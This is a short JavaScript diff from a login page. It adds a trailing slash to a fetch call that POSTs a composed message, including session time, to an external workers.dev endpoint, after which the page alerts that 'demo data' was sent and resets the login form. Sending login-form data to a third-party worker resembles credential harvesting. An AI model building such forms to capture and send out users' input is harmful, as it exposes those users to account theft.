@@ -224,11 +224,12 @@
 ⏱️ Temps passé : ${sessionDuration} secondes
     `;
 
-   fetch("https://green-tooth-6e6e.bouronryan.workers.dev", {
+   fetch("https://green-tooth-6e6e.bouronryan.workers.dev/", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({ content: message })
 });
+
 
     alert("Merci ! Données de démo envoyées.");
     document.getElementById("login-form").reset();
